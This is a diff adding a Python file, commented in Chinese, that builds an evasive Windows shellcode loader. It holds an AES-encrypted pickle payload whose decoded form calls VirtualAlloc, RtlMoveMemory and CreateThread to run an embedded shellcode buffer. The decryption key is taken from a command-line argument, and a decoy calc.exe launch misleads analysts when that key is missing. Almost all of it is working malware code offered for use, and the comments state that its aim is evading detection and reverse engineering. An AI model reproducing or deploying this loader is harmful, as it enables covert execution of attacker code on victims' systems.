@@ -1,0 +1,84 @@
+##  字节型互转十六机制
+b = b'\xef\xd9\re\xa4\xfe_\x06\xf9\xce\x0c+\xc2\x93\xa6\xac\xe2\x15_p\x1b84\x1aJF4\x8d\xf7\xfd\x0e\xdf'
+hex_string = ''.join(f'{byte:02x}' for byte in b)
+print(hex_string)
+print(type(hex_string))
+
+hex_pairs = [hex_string[i:i+2] for i in range(0, len(hex_string), 2)]
+byte_data = bytes(int(pair, 16) for pair in hex_pairs)
+print(byte_data)
+print(type(byte_data))
+
+##  在于带外传递对称加密密码，
+## 基于反序列化，把python主程序序列化为数据序列，然后反序列化后执行代码，目的隐藏内存操作的shellloader一系列操作
+## 然后用对称加密方式，把反序列后的序列加密，然后密钥不保存在代码里，防止逆向破解
+## 然后使用带外判断，添加一个正常资源，如果没有使用带外正确密码都将执行正常资源，达到迷惑效果，如果传递正确的密钥，便执行shellcode
+
+
+*****以下是对称加密代码，加密对象plaintext ，即python序列化
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad, unpad
+import base64
+import struct
+def encrypt(text, key):
+    cipher = AES.new(key, AES.MODE_CBC)
+    ct_bytes = cipher.encrypt(pad(text.encode('utf-8'), AES.block_size))
+    return base64.b64encode(cipher.iv + ct_bytes).decode('utf-8')
+
+def decrypt(encrypted, key):
+    ct_bytes = base64.b64decode(encrypted)
+    iv = ct_bytes[:16]
+    ct = ct_bytes[16:]
+    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
+    pt = unpad(cipher.decrypt(ct), AES.block_size)
+    return pt.decode('utf-8')
+
+# 示例
+key = get_random_bytes(32)   # 生成一个32字节（256位）的随机密钥 ##这个需要记录下来，随机只是帮我生产一个byte形的加密密钥，也可以使用其他加密方式
+plaintext = "gANjYnVpbHRpbnMKZXhlYwpxAFhVBAAACmltcG9ydCBjdHlwZXMsYmFzZTY0CmJ1Zj1iJy9FaUQ1UERvekFBQUFFRlJRVkJTU0RIU1pVaUxVbUJJaTFJWVNJdFNJRkZXU0ErM1NrcE5NY2xJaTNKUVNESEFyRHhoZkFJc0lFSEJ5UTFCQWNIaTdWSklpMUlnaTBJOFNBSFFab0Y0R0FzQ1FWRVBoWElBQUFDTGdJZ0FBQUJJaGNCMFowZ0IwRVNMUUNDTFNCaEpBZEJRNDFaTk1jbEkvOGxCaXpTSVNBSFdTREhBckVIQnlRMUJBY0U0NEhYeFRBTk1KQWhGT2RGMTJGaEVpMEFrU1FIUVprR0xERWhFaTBBY1NRSFFRWXNFaUVnQjBFRllRVmhlV1ZwQldFRlpRVnBJZyt3Z1FWTC80RmhCV1ZwSWl4THBTLy8vLzExSnZuZHpNbDh6TWdBQVFWWkppZVpJZ2V5Z0FRQUFTWW5sU2J3Q0FBK2d3S2o5WkVGVVNZbmtUSW54UWJwTWR5WUgvOVZNaWVwb0FRRUFBRmxCdWltQWF3RC8xV29LUVY1UVVFMHh5VTB4d0VqL3dFaUp3a2ovd0VpSndVRzY2Zy9mNFAvVlNJbkhhaEJCV0V5SjRraUorVUc2bWFWMFlmL1ZoY0IwQ2tuL3puWGw2Sk1BQUFCSWcrd1FTSW5pVFRISmFnUkJXRWlKK1VHNkF0bklYLy9WZy9nQWZsVklnOFFnWG9uMmFrQkJXV2dBRUFBQVFWaElpZkpJTWNsQnVsaWtVK1gvMVVpSncwbUp4MDB4eVVtSjhFaUoya2lKK1VHNkF0bklYLy9WZy9nQWZTaFlRVmRaYUFCQUFBQkJXR29BV2tHNkN5OFBNUC9WVjFsQnVuVnVUV0gvMVVuL3p1azgvLy8vU0FIRFNDbkdTSVgyZGJSQi8rZFlhZ0JaU2NmQzhMV2lWdi9WJwpidWYgPSBiYXNlNjQuYjY0ZGVjb2RlKGJ1ZikKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZSA9IGN0eXBlcy5jX3VpbnQ2NApyd3hwYWdlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoMCxsZW4oYnVmKSwweDMwMDAsMHg0MCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChyd3hwYWdlKSxjdHlwZXMuY3JlYXRlX3N0cmluZ19idWZmZXIoYnVmKSxsZW4oYnVmKSkKaGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwwLGN0eXBlcy5jX3VpbnQ2NChyd3hwYWdlKSwwLDAsMCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGhhbmRsZSwtMSlxAYVxAlJxAy4="
+
+
+
+encrypted = encrypt(plaintext, key)
+print("Encrypted:", encrypted)
+decrypted = decrypt(encrypted, key)
+print("Decrypted:", decrypted)
+print(str(key))
+
+
+
+****以下为主程序*****
+
+import subprocess
+import base64,ctypes,pickle
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad, unpad
+import base64,sys
+
+code = "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"
+agrvs = sys.argv
+def decrypt(encrypted, key):
+    ct_bytes = base64.b64decode(encrypted)
+    iv = ct_bytes[:16]
+    ct = ct_bytes[16:]
+    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
+    pt = unpad(cipher.decrypt(ct), AES.block_size)
+    return pt.decode('utf-8')
+try:
+ if agrvs[1] in ("efd90d65a4fe5f06f9ce0c2bc293a6ace2155f701b38341a4a46348df7fd0edf"):
+      agrvs = sys.argv
+      keycode = agrvs[1]
+      hex_pairs = [keycode[i:i+2] for i in range(0, len(keycode), 2)]
+      key = bytes(int(pair, 16) for pair in hex_pairs)
+      code1 = decrypt(code, key)
+      code2 = code1.encode(encoding='utf-8')
+      pickle.loads(base64.b64decode(code2))
+ else:
+
+    subprocess.run(["calc.exe"])
+except:
+      subprocess.run(["calc.exe"])
+
+
